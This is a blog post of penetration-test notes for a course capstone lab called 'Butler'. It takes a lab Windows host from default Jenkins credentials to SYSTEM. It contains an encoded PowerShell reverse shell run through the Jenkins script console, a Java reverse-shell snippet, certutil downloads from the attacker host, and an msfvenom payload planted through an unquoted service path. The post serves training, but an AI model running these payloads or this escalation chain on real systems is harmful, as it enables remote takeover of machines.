---
layout: post
title: "PJPT Capstone: Butler"
author: Andrew Cherney
date: 2024-01-31 04:59:57
tags: pjpt windows webapp 
icon: "assets/icons/pjpt.png"
post_description: "This is a part of the mid-course capstone of the PJPT. Structured more as pentest notes than an actual writeup. A little dip into default credentials and some windows shenanigans."
---

# Summary

{{ page.post_description }}

10.0.69.10

### Findings

445 10.0.69.10 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1)

<br>
8080 10.0.69.10 - Jetty 9.4.41.v20210516

- Information Disclosure - /adjuncts/3a890183/ - Jenkins 2.289.3
- Unpatched Service - Jenkins 2.289.3
- Weak Credentials - jenkins:jenkins login
- Authenticated RCE - Jenkins /script console

<br>
localhost 10.0.69.10

- Unquoted Service Path - WiseBootAssistant

<br>

# Enum

### Network Scan

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~]
└──╼ $nmap -T4 -p- -A 10.0.69.10
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-26 22:47 CST
Nmap scan report for 10.0.69.10
Host is up (0.0011s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 14s
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:69:6f:d1 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-01-27T04:51:16
|_  start_date: N/A
```




### SMB

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $smbclient -L ///10.0.69.10//
Enter WORKGROUP\raccoon's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $enum4linux 10.0.69.10
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 26 23:20:17 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.0.69.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.0.69.10    |
 ================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ========================================== 
|    Nbtstat Information for 10.0.69.10    |
 ========================================== 
Looking up status of 10.0.69.10
	BUTLER          <00> -         B <ACTIVE>  Workstation Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	BUTLER          <20> -         B <ACTIVE>  File Server Service

	MAC Address = 08-00-27-69-6F-D1

 =================================== 
|    Session Check on 10.0.69.10    |
 =================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $crackmapexec smb 10.0.69.10 --rid-brute
SMB         10.0.69.10      445    BUTLER           [*] Windows 10.0 Build 19041 x64 (name:BUTLER) (domain:Butler) (signing:False) (SMBv1:False)
SMB         10.0.69.10      445    BUTLER           [-] Error creating DCERPC connection: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

### Webapp - 8080

![](/img/butler/butler_8080_dirbuster_scan.png)


![](/img/butler/butler_jenkins_error_version_leak.png)

jenkins:jenkins credentials

![](/img/butler/butler_8080_burp_brute_login.png)

![](/img/butler/butler_8080_script_console_dir.png)

Jenkins Script Console
https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.md

place in payload

```bash
def process = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADYAOQAuADUAIgAsADcANwA3ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA".execute()
printIn "> ${process.text}"
```

# butler

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.0.69.10 49685
whoami
butler\butler
PS C:\Program Files\Jenkins> 
```

jenkins env location
```bash
<service>
  <id>jenkins</id>
  <name>Jenkins</name>
  <description>This service runs Jenkins automation server.</description>
  <env name="JENKINS_HOME" value="%LocalAppData%\Jenkins\.jenkins"/>
  <!--
    if you'd like to run Jenkins with a specific version of Java, specify a full path to java.exe.
    The following value assumes that you have java in your PATH.
```

```bash
PS C:\Users\butler\AppData\Local\Jenkins\.jenkins> type config.xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors>
    <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
  </disabledAdministrativeMonitors>
  <version>2.289.3</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
  </authorizationStrategy>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
</hudson>
```

```bash
PS C:\Users\butler\AppData\Local\Jenkins\.jenkins\users\jenkins_5638981406360755566> type config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>jenkins</id>
  <fullName>jenkins</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.5">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.83">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>176f4bd381e4ec55</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$MPpqVmtaCTVUTB8wqHeGquT5VeNEsvwj4qe1yBfaU/6uSwbbve0QO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>jenkins@butler.com</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1628948273384</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

```bash
PS C:\Users\butler\Desktop> certutil.exe -urlcache -f http://10.0.69.5:8080/winPEASany.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\butler\Desktop> dir


    Directory: C:\Users\butler\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/27/2024   1:06 AM        1969664 winpeas.exe                                                          


PS C:\Users\butler\Desktop> 

```
Better shell cause winpeas wasnt working
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

```powershell
String host="10.0.69.5";
int port=7777;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Winpeas

```powershell
c:\Users\butler\Desktop>winpeas.exe

   =================================================================================================

    WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])
    In order to optimize system performance,Wise Care 365 will calculate your system startup time.
   =================================================================================================

```

unquoted service paths

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.69.5 LPORT=8888 -f exe -o Wise.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Wise.exe
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $httpserver
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.69.10 - - [27/Jan/2024 01:34:28] "GET /Wise.exe HTTP/1.1" 200 -
10.0.69.10 - - [27/Jan/2024 01:34:28] "GET /Wise.exe HTTP/1.1" 200 -
```

```bash
c:\Program Files (x86)\Wise>certutil.exe -urlcache -f http://10.0.69.5:8080/Wise.exe Wise.exe         
certutil.exe -urlcache -f http://10.0.69.5:8080/Wise.exe Wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

01/27/2024  01:34 AM    <DIR>          .
01/27/2024  01:34 AM    <DIR>          ..
08/14/2021  04:34 AM    <DIR>          Wise Care 365
01/27/2024  01:34 AM             7,168 Wise.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  12,704,473,088 bytes free

c:\Program Files (x86)\Wise>net stop WiseBootAssistant
net stop WiseBootAssistant
The Wise Boot Assistant service is stopping.
The Wise Boot Assistant service was stopped successfully.


c:\Program Files (x86)\Wise>net start WiseBootAssistant
net start WiseBootAssistant
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.

```
```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Butler]
└──╼ $nc -nvlp 8888
Listening on 0.0.0.0 8888
Connection received on 10.0.69.10 49683
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

